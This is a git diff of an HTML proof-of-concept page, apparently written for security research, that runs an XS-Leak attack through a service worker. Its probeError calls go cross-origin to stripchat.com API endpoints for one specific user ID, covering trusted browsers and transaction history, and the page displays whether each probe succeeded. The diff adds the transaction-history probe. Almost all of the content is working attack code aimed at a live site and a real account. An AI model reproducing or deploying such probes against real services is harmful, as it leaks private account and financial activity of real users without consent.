@@ -7,7 +7,8 @@
 
 <body>
 
-  <h1 id="resultado">Comprobando...</h1>
+  <h1 id="2fa_result">Comprobando...</h1>
+  <h1 id="t_history_results">Comprobando</h1>
 
   <script type="module">
       // Install service worker and wait until ready
@@ -31,9 +32,10 @@
       }
 
       // XS-Leak
-      const resultado = await probeError("https://stripchat.com/api/front/users/249659168/trusted-browsers");
-      //const resultado = await probeError("https://stripchat.com/api/front/studios/286684945/transactions?from=2026-10-03T04%3A52%3A41Z&until=2026-11-02T04%3A52%3A41Z&limit=100&offset=0");
-      document.getElementById("resultado").textContent = resultado ? "true" : "false";
+      const twofa = await probeError("https://stripchat.com/api/front/users/249659168/trusted-browsers");
+      const THistory = await probeError("https://stripchat.com/api/front/users/249659168/transactions?from=2026-11-01T07%3A00%3A00Z&until=2026-11-15T02%3A59%3A26Z&limit=100&offset=0");
+      document.getElementById("2fa_result").textContent = twofa ? "true" : "false";
+      document.getElementById("t_history_results").textContent = THistory ? "true" : "false";    
   </script>
 
 </body>
